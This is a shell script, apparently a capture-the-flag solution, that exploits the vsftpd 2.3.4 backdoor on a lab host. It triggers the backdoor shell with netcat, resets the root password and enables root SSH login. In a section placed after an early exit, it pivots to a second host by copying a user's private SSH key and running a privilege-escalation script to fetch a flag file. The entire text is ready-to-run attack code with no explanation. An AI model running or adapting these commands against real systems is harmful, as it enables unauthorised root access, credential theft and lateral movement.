#!/bin/sh

ssh-keygen -f "/home/jb/.ssh/known_hosts" -R "10.42.2.1"
rm -f nc
rm -f nc2
rm -f scp1
rm -f ssh1
rm -f scp2
sudo pkill netcat

mkfifo nc
tail -f nc | netcat 10.42.2.1 21 &
echo "USER x:)" > nc
echo "PASS any" > nc
rm -f nc


sleep 0.5

mkfifo nc2
tail -f nc2 | sudo netcat 10.42.2.1 6200 -p 1 &
echo "echo 'root:toto' | chpasswd" > nc2
echo "echo 'PermitRootLogin yes' >> /etc/ssh/sshd_config" > nc2
echo "kill -SIGHUP \$(ps -eaf | grep sshd | head -1 | awk '{print \$1}')" > nc2
rm -f nc2

sudo pkill netcat

exit


#ssh root@10.42.2.1 "cp /home/ouioui/.ssh/id_rsa /root/.ssh/; ssh ouioui@10.42.3.1"
sleep 1

mkfifo scp1
tail -f scp1 | scp -o StrictHostKeyChecking=no soluce.py root@10.42.2.1:/root &
echo "toto" > scp1
echo "" > scp1
rm -f scp1

mkfifo ssh1
tail -f ssh1 | ssh -o StrictHostKeyChecking=no root@10.42.2.1 &
echo "toto" > ssh1
echo "" > ssh1
echo "mkdir /root/.ssh" > ssh1
echo "cp /home/ouioui/.ssh/id_rsa /root/.ssh" > ssh1
echo "scp -o StrictHostKeyChecking=no /root/soluce.py ouioui@10.42.3.1:/home/ouioui" > ssh1
echo "ssh -o StrictHostKeyChecking=no ouioui@10.42.3.1 \"echo 'chown -R ouioui /root' | python3 /home/ouioui/soluce.py\"" > ssh1
echo "scp -o StrictHostKeyChecking=no ouioui@10.42.3.1:/root/flag.txt /root" > ssh1
rm -f ssh1

mkfifo scp2
tail -f scp2 | scp -o StrictHostKeyChecking=no root@10.42.2.1:/root/flag.txt . &
echo "toto" > scp2
echo "" > scp2
rm -f scp2

cat flag.txt


